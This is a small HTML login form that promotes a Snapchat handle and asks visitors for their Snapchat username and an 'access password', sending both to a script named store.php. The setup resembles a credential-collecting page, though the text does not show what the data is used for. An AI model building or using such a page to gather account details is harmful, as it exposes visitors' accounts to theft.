<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login Page</title>
  </head>
  <style>
      label {
          border: 1px;
      }
  </style>
  
  
  
  
  <body>
    <center>
        <p class="disclaimer"><b>DISCLAIMER: </b> NEW SNAPCHAT: perky.werkys <b>NEW UPDATE 12/20/2023</b></p>
      <form action="store.php" method="post">
        <label for="username">Enter your Snapchat username:</label>
        <input type="text" name="username" required>
        <br />
        <label for="password">Enter the access password:</label>
        <input type="password" name="password" required>
        <br /><br />
        <input type="submit" value="Submit">
      </form>
    </center>
  </body>
</html>

